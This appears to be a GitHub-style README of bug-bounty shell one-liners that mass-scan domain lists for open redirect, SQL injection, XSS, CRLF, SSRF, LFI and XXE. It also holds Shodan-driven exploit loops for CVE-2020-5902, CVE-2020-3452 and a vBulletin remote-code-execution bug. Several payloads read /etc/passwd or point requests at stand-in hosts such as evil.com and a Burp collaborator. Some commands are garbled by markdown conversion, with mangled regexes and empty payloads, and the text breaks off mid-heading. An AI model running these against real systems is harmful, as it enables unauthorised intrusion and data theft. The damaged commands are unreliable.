# bug_bounty_one_liners

This is collected from different sources and I have added some of my own. It still needs a lot of curation to be done. I will be adding more as I find them.

## 1. Open Redirect Check One Liner

### On Live Domains List (File containing Live Domains)

Explanation – Takes input of live domains file and passes it to rush which runs 40 workers (-j40) parallely and displays if the injected value is reflected in response header (Location).

```bash
cat live-domains | rush -j40 'if curl -Iks -m 10 "{}/[https://redirect.com](https://redirect.com/)" | egrep "^(Location|location)\\\\:(| \*| (http|https)\\\\:\\\\/\\\\/| \*\\\\/\\\\/| \[a-zA-Z\]\*\\\\.| (http|https)\\\\:\\\\/\\\\/\[a-zA-Z\]\*\\\\.)redirect\\\\.com" || curl -Iks -m 10 "{}/redirect.com" | egrep "^(Location|location)\\\\:(| \*| (http|https)\\\\:\\\\/\\\\/| \*\\\\/\\\\/| \[a-zA-Z\]\*\\\\.| (http|https)\\\\:\\\\/\\\\/\[a-zA-Z\]\*\\\\.)redirect\\\\.com" || curl -Iks -m 10 "{}////;@redirect.com" | egrep "^(Location|location)\\\\:(| \*| (http|https)\\\\:\\\\/\\\\/| \*\\\\/\\\\/| \[a-zA-Z\]\*\\\\.| (http|https)\\\\:\\\\/\\\\/\[a-zA-Z\]\*\\\\.)redirect\\\\.com" || curl -Iks -m 10 "{}/////redirect.com" | egrep "^(Location|location)\\\\:(| \*| (http|https)\\\\:\\\\/\\\\/| \*\\\\/\\\\/| \[a-zA-Z\]\*\\\\.| (http|https)\\\\:\\\\/\\\\/\[a-zA-Z\]\*\\\\.)redirect\\\\.com"; then echo "{} It seems an Open Redirect Found"; fi'
```

### On Parameters (File containing urls with parameters)

Explanation – Takes input of urls file which then passes to qsreplace which replaces the parameter value to the injected one. Then it passes it to rush which runs 40 workers parallely and checks if the injected value comes in response header(Location).

```bash
cat urls.txt | qsreplace "[https://redirect.com](https://redirect.com/)" | rush -j40 'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\\\:(| \*| (http|https)\\\\:\\\\/\\\\/| \*\\\\/\\\\/| \[a-zA-Z\]\*\\\\.| (http|https)\\\\:\\\\/\\\\/\[a-zA-Z\]\*\\\\.)redirect\\\\.com"; then echo "Open Redirect found on {}"; fi'
```

Test Case 2

```bash
cat urls.txt | qsreplace "[redirect.com](http://redirect.com/)" | rush -j40 'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\\\:(| \*| (http|https)\\\\:\\\\/\\\\/| \*\\\\/\\\\/| \[a-zA-Z\]\*\\\\.| (http|https)\\\\:\\\\/\\\\/\[a-zA-Z\]\*\\\\.)redirect\\\\.com"; then echo "Open Redirect found on {}"; fi'
```

Test Case 3

```bash
cat urls.txt | qsreplace "////;@redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\\\:(| \*| (http|https)\\\\:\\\\/\\\\/| \*\\\\/\\\\/| \[a-zA-Z\]\*\\\\.| (http|https)\\\\:\\\\/\\\\/\[a-zA-Z\]\*\\\\.)redirect\\\\.com"; then echo "Open Redirect found on {}"; fi'
```

Test Case 4

```bash
cat urls.txt | qsreplace "/////redirect.com" | rush -j40 'if curl -Iks -m 10 "{}" | egrep "^(Location|location)\\\\:(| \*| (http|https)\\\\:\\\\/\\\\/| \*\\\\/\\\\/| \[a-zA-Z\]\*\\\\.| (http|https)\\\\:\\\\/\\\\/\[a-zA-Z\]\*\\\\.)redirect\\\\.com"; then echo "Open Redirect found on {}"; fi'
```

### On Headers (File containing Live Domains)

Explanation – Takes input of live domains as a list and append all the headers with the injected value in the request and checks if it reflected in response header (Location)

```bash
cat live-domains | rush -j40 'if curl -Iks -m 10 "$line" -H "CF-Connecting\_IP: [https://redirect.com](https://redirect.com/)" -H "From: root@[https://redirect.com](https://redirect.com/)" -H "Client-IP: [https://redirect.com](https://redirect.com/)" -H "X-Client-IP: [https://redirect.com](https://redirect.com/)" -H "X-Forwarded-For: [https://redirect.com](https://redirect.com/)" -H "X-Wap-Profile: [https://redirect.com](https://redirect.com/)" -H "Forwarded: [https://redirect.com](https://redirect.com/)" -H "True-Client-IP: [https://redirect.com](https://redirect.com/)" -H "Contact: root@[https://redirect.com](https://redirect.com/)" -H "X-Originating-IP: [https://redirect.com](https://redirect.com/)" -H "X-Real-IP: [https://redirect.com](https://redirect.com/)" | egrep "^(Location|location)\\\\:(| \*| (http|https)\\\\:\\\\/\\\\/| \*\\\\/\\\\/| \[a-zA-Z\]\*\\\\.| (http|https)\\\\:\\\\/\\\\/\[a-zA-Z\]\*\\\\.)redirect\\\\.com" || curl -Iks -m 10 "$line" -H "CF-Connecting\_IP: [redirect.com](http://redirect.com/)" -H "From: [root@redirect.com](mailto:root@redirect.com)" -H "Client-IP: [redirect.com](http://redirect.com/)" -H "X-Client-IP: [redirect.com](http://redirect.com/)" -H "X-Forwarded-For: [redirect.com](http://redirect.com/)" -H "X-Wap-Profile: [redirect.com](http://redirect.com/)" -H "Forwarded: [redirect.com](http://redirect.com/)" -H "True-Client-IP: [redirect.com](http://redirect.com/)" -H "Contact: [root@redirect.com](mailto:root@redirect.com)" -H "X-Originating-IP: [redirect.com](http://redirect.com/)" -H "X-Real-IP: [redirect.com](http://redirect.com/)" | egrep "^(Location|location)\\\\:(| \*| (http|https)\\\\:\\\\/\\\\/| \*\\\\/\\\\/| \[a-zA-Z\]\*\\\\.| (http|https)\\\\:\\\\/\\\\/\[a-zA-Z\]\*\\\\.)redirect\\\\.com"; then echo "The URL $line with vulnerable header may be vulnerable to Open Redirection. Check Manually";fi'
```

## 2. SQL Injection Check OneLiner

### On list of URLs

Explanation – Rush takes input urls file and parallely runs 20 workers of sqlmap. First it checks wheather if the URL is alive or not.

```bash
cat urls.txt | rush -j20 'if curl -Is "{}" | head -1 | grep -q "HTTP"; then echo "Running Sqlmap on '{}'"; sqlmap -u "{}" --batch --random-agent --dbs; fi'
```

## 3. Open Redirect Check based on Location Header

Explanation – If the URL has the response as 301,302,307, then it checks if the Location header value is present in the original url or not. If the value is present in the url or parameter, then it tries to replace it with the custom value, if it gets the reflected custom value in response header, then it alerts as open redirect found.

```bash
cat urls.txt | rush 'if curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "HTTP/1.1 \\|HTTP/2" | cut -d" " -f2 | grep -q "301\\|302\\|307";then domain=\curl -skI "{}" -H "User-Agent: Mozilla/Firefox 80" | grep -i "Location\\\\:\\\\|location\\\\:" | cut -d" " -f2 | cut -d"/" -f1-3 | sed "s/^http\\\\(\\\\|s\\\\):\\\\/\\\\///g" | sed "s/\\\\s\\*$//"\\; path=\echo "{}" | cut -d"/" -f4-20\\; if echo "$path" | grep -q "$domain"; then echo "Reflection Found on Location headers from URL '{}'";fi;fi'
```

## 4. XSS Checks on list of Urls

Explanation – Takes input of urls file and passes it to dalfox tool for [xss](https://www.codelivly.com/xss-payload-list-cross-site-scripting-vulnerability-payload-list/) scanning and saves it to xss.txt file.

```bash
cat urls.txt | dalfox pipe --multicast -o xss.txt
```

## 5. CRLF Injection Check One Liner

### On Live Domains

Explanation – Takes input of live domains file and passes it to rush which runs 40 workers (-j40) parallely and displays if the injected value is reflected in response header.

```bash
cat live-domains | rush -j40 'if curl -Iks -m 10 "{}/%0D%0Acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "{}/%0d%0acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "{}/%E5%98%8D%E5%98%8Acrlf:crlf" | grep -q "^crlf:crlf"; then echo "The URL {} may be vulnerable to CRLF Injection. Check Manually";fi'
```

### On Live Urls with Parameters

Explanation – Takes input of urls file and passes it to qsreplace which replaces the value of parameters as the injected one and passes it to rush which runs 40 workers (-j40) parallely and displays if the injected value is reflected in response header.

```bash
cat urls.txt | qsreplace "%0d%0acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
```

Test Case 2

```bash
cat urls.txt | qsreplace "%E5%98%8D%E5%98%8Acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
```

Test Case 3

```bash
cat urls.txt | qsreplace -a "%0d%0acrlf:crlf" | rush -j40 'if curl -skI -m 10 "{}" | grep -q "^crlf:crlf"; then echo "CRLF found on {}"; fi'
```

### On Headers (Files containing live domains)

Explanation – If any header is vulnerable to crlf injection, then it alerts.

```bash
cat $1 | rush -j40 'if curl -Iks -m 10 "{}" -H "CF-Connecting\_IP: %0d%0acrlf:crlf" -H "From: root@%0d%0acrlf:crlf" -H "Client-IP: %0d%0acrlf:crlf" -H "X-Client-IP: %0d%0acrlf:crlf" -H "X-Forwarded-For: %0d%0acrlf:crlf" -H "X-Wap-Profile: %0d%0acrlf:crlf" -H "Forwarded: %0d%0acrlf:crlf" -H "True-Client-IP: %0d%0acrlf:crlf" -H "Contact: root@%0d%0acrlf:crlf" -H "X-Originating-IP: %0d%0acrlf:crlf" -H "X-Real-IP: %0d%0acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "$line" -H "CF-Connecting\_IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "From: root@%E5%98%8D%E5%98%8Acrlf:crlf" -H "Client-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Client-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Forwarded-For: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Wap-Profile: %E5%98%8D%E5%98%8Acrlf:crlf" -H "Forwarded: %E5%98%8D%E5%98%8Acrlf:crlf" -H "True-Client-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "Contact: root@%E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Originating-IP: %E5%98%8D%E5%98%8Acrlf:crlf" -H "X-Real-IP: %E5%98%8D%E5%98%8Acrlf:crlf" | grep -q "^crlf:crlf" || curl -Iks -m 10 "$line" -H "CF-Connecting\_IP: %0D%0Acrlf:crlf" -H "From: root@%0D%0Acrlf:crlf" -H "Client-IP: %0D%0Acrlf:crlf" -H "X-Client-IP: %0D%0Acrlf:crlf" -H "X-Forwarded-For: %0D%0Acrlf:crlf" -H "X-Wap-Profile: %0D%0Acrlf:crlf" -H "Forwarded: %0D%0Acrlf:crlf" -H "True-Client-IP: %0D%0Acrlf:crlf" -H "Contact: root@%0D%0Acrlf:crlf" -H "X-Originating-IP: %0D%0Acrlf:crlf" -H "X-Real-IP: %0D%0Acrlf:crlf" | grep -q "^crlf:crlf"; then echo "The URL {} with vulnerable header may be vulnerable to CRLF Injection. Check Manually";fi'
```

## 6. SSRF Check One Liner

### On Headers (File containing live domains)

Explanation – Injceted burp collaborator server in requested headers and issues a request and saves it in the output file including each request timing so that if one gets a hit, he can confirm by checking the request timing.

Replace $2 with your burp collaborator server.

```bash
cat live-domains | rush -j40 'if curl -skL -o /dev/null "{}" -H "CF-Connecting\_IP: $2" -H "From: root@$2" -H "Client-IP: $2" -H "X-Client-IP: $2" -H "X-Forwarded-For: $2" -H "X-Wap-Profile: [http://$2/wap.xml](http://$2/wap.xml)" -H "Forwarded: $2" -H "True-Client-IP: $2" -H "Contact: root@$2" -H "X-Originating-IP: $2" -H "X-Real-IP: $2"; then echo "{}" | ts; fi' | tee -a ssrf-headers-out.txt
```

### On Urls containing params

Explanation – Takes urls list, replaces the params value to the burp collaborator server and passes it to rush for parallel working.

```bash
cat urls.txt | qsreplace "your.burpcollaborator.server" | rush -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt
```

Test Case 2

```bash
cat params.txt | qsreplace "[http://$1](http://$1/)" | rush -j40 'if curl -skL "{}" -o /dev/null; then echo "{}" | ts; fi' | tee -a ssrf-output-log.txt
```

## 7. SpringBoot Actuator Check One Liner

### On Live Domains

Explanation – Takes live domains list and checks wheather the springboot actuators are publicly accessible or not.

```bash
cat live-domains | rush -j40 'if curl -skI -m 10 "{}/env" | grep -i "x-application-context" || curl -sk -m 10 "{}/actuator/env" | grep -q "sping.config.location\\|[spring.application.name](http://spring.application.name/)\\|JAVA\_HOME" || curl -sk -m 10 "{}/env" | grep -q "sping.config.location\\|[spring.application.name](http://spring.application.name/)\\|JAVA\_HOME" || curl -sk -m 10 "{}/actuator" | grep -q '{"\_links":{"self"' || curl -sk -m 10 "{}/actuator/configprops" | grep -q "org.springframework.boot.actuate\\|beans" || curl -sk -m 10 "{}/configprops" | grep -q "org.springframework.boot.actuate\\|beans"; then echo "SpringBoot Actuator Found on {}"; fi' &
```

### On Live urls with params

Explanation – Takes urls list and checks wheather the application is using springboot or not.

```bash
cat params.txt | rush -j40 'if curl -skI -m 10 "{}" | grep -i "x-application-context"; then echo "SpringBoot application context header Found on {}"; fi'
```

## 8. Drop Blind XSS payload on list of Urls with params

Explanation – Takes urls file as input, replaces the param value with blind xss payload and issues the request with 40 workers running parallely.

```bash
cat urls.txt | qsreplace '">' | rush -j40 'curl -sk "{}" -o /dev/null'
```

## 9. Reflection Check (XSS) on one domain by extracting Hidden params

Explanation – Extracts the hidden parameters from the page and checks wheather it can be vulnerable to xss or not.

```bash
curl -skL "[https://in.yahoo.com](https://in.yahoo.com/)" | grep 'type="hidden"' | grep -Eo 'name="\[^\\"\]+"' | cut -d'"' -f2 | xargs -I@ sh -c 'if curl -skL [https://in.yahoo.com/?@=testxss](https://in.yahoo.com/?@=testxss) | grep -q "value=testxss"; then echo "reflection found from @ parameter"; fi'
```

## 10. Find hidden parameters via Crawl on list of urls

Explanation – Takes urls list and extracts hidden parameters from the list of urls and saves unique params in the file.

```bash
cat alive.txt | rush 'curl -skL "{}" | grep "type\\=\\"hidden\\"" | grep -Eo "name\\=\\"\[^\\"\]+\\"" | cut -d"\\"" -f2 | sort -u' | anew params.txt
```

## 11. Find Secrets in Javascripts files via crawling

Explanation – Takes live domains as input, crawled using hakrawler tool which extracts javascript files  and then passes it to Secretfinder script which checks for sensitive data in the javascript files.

```bash
cat alive.txt | rush 'hakrawler -plain -js -depth 2 -url {}' | rush 'python3 /root/Tools/SecretFinder/SecretFinder.py -i {} -o cli' | anew secretfinder
```

## 12. Fetch Domains from Wayback Archive (Input Root-Domains)

Explanation – Takes the input of root-domains file and extracts the domains from the wayback archive.

Root-domains example – [gq1.yahoo.com](http://gq1.yahoo.com/), [abc.yahoo.com](http://abc.yahoo.com/), [root.yahoo.com](http://root.yahoo.com/) etc

```bash
cat root-dom.txt | rush 'curl -s "[http://web.archive.org/cdx/search/cdx?url=\\*.{](http://web.archive.org/cdx/search/cdx?url=%5C%5C*.%7B)}/\*&output=text&fl=original&collapse=urlkey" | sed -e 's\_https\*://\*\*' -e "s/\\/.\*//" | sed 's/\\.com.\*/.com/' | sort -u'
```

## 13. Directory Bruteforce using dirsearch and ffuf

Explanation – Direcotry bruteforce using ffuf. Takes input of live domains and scans for direcotries & files.

```bash
cat alive.txt | xargs -I@ sh -c 'ffuf -c -w /path/to/wordlist -D -e php,aspx,html,do,ashx -u @/FUZZ -ac -t 200' | tee -a dir-ffuf.txt
```

### using dirsearch

Explanation – Direcotry bruteforce using dirsearch. Takes input of live domains and scans for direcotries & files.

```bash
cat alive.txt | xargs -I@ sh -c 'python3 /root/Tools/dirsearch/dirsearch.py -w /path/to/wordlist.txt -u @ -e php,html,json,aspx -t 100' | tee -a dirsearch
```

## 14. Crawl list of Domains

Explanation – Crawling list of domains parallely with 30 workers.

```bash
cat alive.txt | xargs -P30 -I@ gospider -c 30 -t 15 -a -s @ -d 3 | anew spider
```

## 15. Subdomain bruteforce using ffuf

Explanation – Bruteforce subdomains using ffuf tool.

```bash
ffuf -u [https://FUZZ.domain.com](https://fuzz.domain.com/) -w /path/to/wordlist -v | grep "| URL |" | awk '{print $4}'
```

## 16. Log4J Scan on list of domains

Explanation – Takes live domains as input and scans for log4j vulnerabilities.

```bash
cat alive.txt | xargs -I@ sh -c 'python3 /path/to/log4j-scan.py -u "@"
```

## 17. Hunt XSS

```bash
cat targets.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @ cat targets.txt | getJS | httpx --match-regex "addEventListener\\((?:'|\\")message(?:'|\\")"
```

## 18. Hunt SQLi

```bash
httpx -l targets.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1'
```

## 19. Hunt SSRF

```bash
findomain -t [http://target.com](http://target.com/) -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace [http://YOUR.burpcollaborator.net](http://your.burpcollaborator.net/)
```

## 20. Hunt LFI

```bash
gau [http://vuln.target.com](http://vuln.target.com/) | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

## 21. Hunt Open Redirect

```bash
gau [http://vuln.target.com](http://vuln.target.com/) | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

## 22. Hunt Prototype Pollution

```bash
subfinder -d [http://target.com](http://target.com/) | httpx -silent | sed 's/$/\\/?\*\proto\\*\[testparam\]=exploit\\//' | page-fetch -j 'window.testparam=="exploit"?"\[VULN\]":"\[NOT\]"' | sed "s/(//g"|sed"s/)//g" | sed "s/JS//g" | grep "VULN"
```

## 23. Hunt CORS

```bash
gau [http://vuln.target.com](http://vuln.target.com/) | while read url;do target=$(curl -s -I -H "Origin: [https://evvil.com](https://evvil.com/)" -X GET $url) | if grep '[https://evvil.com](https://evvil.com/)'; then \[Potentional CORS Found\]echo $url;else echo Nothing on "$url";fi;done
```

## 24. Extract .js

```bash
echo [http://target.com](http://target.com/) | haktrails subdomains | httpx -silent | getJS --complete | tojson | anew JS1 assetfinder [http://vuln.target.com](http://vuln.target.com/) | waybackurls | grep -E "\\.json(?:onp?)?$" | anew
```

## 25. Extract URLs from comment

```bash
cat targets.txt | html-tool comments | grep -oE '\\b(https?|http)://\[-A-Za-z0-9+&@#/%?=~\*|!:,.;\]\*\[-A-Za-z0-9+&@#/%=~\*|\]'
```

## 26. Dump In-scope Assets from HackerOne

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone%5C%5C_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
```

## 27. Find live host/domain/assets

```bash
subfinder -d [http://vuln.target.com](http://vuln.target.com/) -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```

## 28. Screenshot

```bash
assetfinder -subs-only [http://target.com](http://target.com/) | httpx -silent -timeout 50 | xargs -I@ sh -c 'gowitness single @'
```

## 29. Blind SQL injection testing with time-based payloads

time curl -s '[https://target.com/search.php?q=1](https://target.com/search.php?q=1) AND sleep(5)--'

## 30. Directory traversal (path traversal) testing

curl '[https://target.com/page.php?page=../../../../etc/passwd](https://target.com/page.php?page=../../../../etc/passwd)'

## 31. WordPress version enumeration

curl -s '[https://target.com/readme.html](https://target.com/readme.html)' | grep 'Version'

## 32. Subdomain takeover testing using subjack

subjack -w subdomains.txt -a -t 100 -v -o takeover.txt -ssl

## 33. HTTP header injection testing

curl -H 'X-Forwarded-For: 127.0.0.1\\r\\nUser-Agent: Mozilla/5.0' '[https://target.com/](https://target.com/)'

## 34. File upload testing

curl -X POST -F 'file=@test.php' '[https://target.com/upload.php](https://target.com/upload.php)'

## 35. Cross-site request forgery (CSRF) testing

curl -X POST -d 'name=admin&password=123456&csrf\_token=123456' '[https://target.com/login.php](https://target.com/login.php)'

## 36. XXE (XML External Entity) injection testing

curl -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo \[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">\]><foo>&xxe;</foo>' '[https://target.com/xxe.php](https://target.com/xxe.php)'

## 37. Get Content-Type

echo [abc.com](http://abc.com/) | gau | grep '\\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'

## 38. Fuzz with FFUF

assetfinder [http://att.com](http://att.com/) | sed 's#\*.# #g' | httpx -silent -threads 10 | xargs -I@ sh -c 'ffuf -w path.txt -u @/FUZZ -mc 200 -H "Content-Type: application/json" -t 150 -H "X-Forwarded-For:127.0.0.1"'

## 39. Extract URL from .apk file

apktool -d com.uber -o uberAPK; grep -Phro "(https?://)\[\\w\\,-/\]+\[\\"\\'\]" uberAPK/ | sed 's#"##g' | anew | grep -v "w3\\|android\\|github\\|schemes.android\\|google\\|[goo.gl](http://goo.gl/)"

## 40. Information Disclosure

cat host.txt | httpx -path //server-status?full=true -status-code -content-length

cat host.txt | httpx -ports 80,443,8009,8080,8081,8090,8180,8443 -path /web-console/ -status-code -content-length

## 41. Reflected XSS

subfinder -d [abc.com](http://abc.com/) | httprobe -c 100 > target.txt cat target.txt | waybackurls | gf xss | kxss

gospider -a -s [abc.com](http://abc.com/) -t 3 -c 100 | tr " " "\\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'

## 42. SSTI to RCE

waybackurls [http://target.com](http://target.com/) | qsreplace "abc{{9\*9}}" > fuzz.txt ffuf -u FUZZ -w fuzz.txt -replay-proxy [http://127.0.0.1:8080/](http://127.0.0.1:8080/)

## 43. Dump In-scope Assets from chaos-bugbounty-list

curl -sL [https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json](https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json) | jq -r '.programs\[\].domains | to\_entries | .\[\].value'

## 44. CORS (Cross-Origin Resource Sharing) testing

curl -I -H 'Origin: [https://evil.com](https://evil.com/)' '[https://target.com/api.php](https://target.com/api.php)'

## 45. Blind SSRF (Server-Side Request Forgery) testing with time-based payloads

time curl -s '[https://target.com/api.php?url=http://evil.com&secret\\_token=123](https://target.com/api.php?url=http://evil.com&secret%5C%5C_token=123)' -H 'X-Forwarded-For: 127.0.0.1'

## 46. JWT (JSON Web Token) testing with jwt\_tool

jwt\_tool.py -t eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV\_adQssw5c -k secret

## 47. GraphQL testing with gqlmap

[gqlmap.py](http://gqlmap.py/) -u '[https://target.com/graphql](https://target.com/graphql)' -t GET --level 2

## 48. XXE (XML External Entity) injection testing with Burp Suite

curl -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo \[<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">\]><foo>&xxe;</foo>' '[https://target.com/xxe.php](https://target.com/xxe.php)' | base64 -w 0 | pbcopy

Then, paste the base64-encoded request into the “Paste from clipboard” feature in Burp Suite.

## 49. API testing with HTTPie

http [https://target.com/api/v1/users/1](https://target.com/api/v1/users/1) Authorization:'Bearer JWT\_TOKEN'

## 50. HTML injection testing

curl -d '' '[https://target.com/comment.php](https://target.com/comment.php)'

This one-liner sends a POST request with a script tag as the comment parameter. The script tag will be reflected in the response if HTML injection is possible, indicating a potential vulnerability for cross-site scripting (XSS) attacks.

## **Definitions**

This section defines specific terms or placeholders that are used throughout one-line command/scripts.

- 1.1. "**HOST**" defines one hostname, (sub)domain, or IP address, e.g. replaced by `internal.host`, `domain.tld`, `sub.domain.tld`, or `127.0.0.1`.
- 1.2. "**HOSTS.txt**" contains criteria 1.1 with more than one in file.
- 2.1. "**URL**" definitely defines the URL, e.g. replaced by `http://domain.tld/path/page.html` or somewhat starting with HTTP/HTTPS protocol.
- 2.2. "**URLS.txt**" contains criteria 2.1 with more than one in file.
- 3.1. "**FILE.txt**" or "**FILE**`{N}`**.txt**" means the files needed to run the command/script according to its context and needs.
- 4.1. "**OUT.txt**" or "**OUT**`{N}`**.txt**" means the file as the target storage result will be the command that is executed.

---

### **Local File Inclusion**

> @dwisiswant0
> 

```bash
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

```

### **Open-redirect**

> @dwisiswant0
> 

```bash
export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'

```

> @N3T_hunt3r
> 

```bash
cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null

```

### **XSS**

> @cihanmehmet
> 

```bash
gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt

```

> @fanimalikhack
> 

```bash
waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt

```

> @oliverrickfors
> 

```bash
cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"

```

### **Prototype Pollution**

> @R0X4R
> 

```bash
subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"

```

### **CVE-2020-5902**

> @Madrobot_
> 

```bash
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done

```

### **CVE-2020-3452**

> @vict0ni
> 

```bash
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt

```

### **CVE-2022-0378**

> @7h3h4ckv157
> 

```bash
cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done

```

### **vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution**

> @Madrobot_
> 

```bash
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;

```

### **Find JavaScript Files**

> @D0cK3rG33k
> 

```bash
assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done

```

### **Extract Endpoints from JavaScript**

> @renniepak
> 

```bash
cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

```

### **Get CIDR & Org Information from Target Lists**

> @steve_mcilwain
> 

```bash
for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done

```

### **Get Subdomains from RapidDNS.io**

> @andirrahmani1
> 

```bash
curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u

```

### **Get Subdomains from BufferOver.run**

> @_ayoubfathi_
> 

```bash
curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u

```

> @AnubhavSingh_
> 

```bash
export domain="HOST"; curl "https://tls.bufferover.run/dns?q=$domain" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$domain"

```

### **Get Subdomains from Riddler.io**

> @pikpikcu
> 

```bash
curl -s "https://riddler.io/search/exportcsv?q=pld:HOST" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

```

### **Get Subdomains from VirusTotal**

> @pikpikcu
> 

```bash
curl -s "https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

```

### **Get Subdomain with cyberxplore**

> @pikpikcu
> 

```
curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+"

```

### **Get Subdomains from CertSpotter**

> @caryhooper
> 

```bash
curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

```

### **Get Subdomains from Archive**

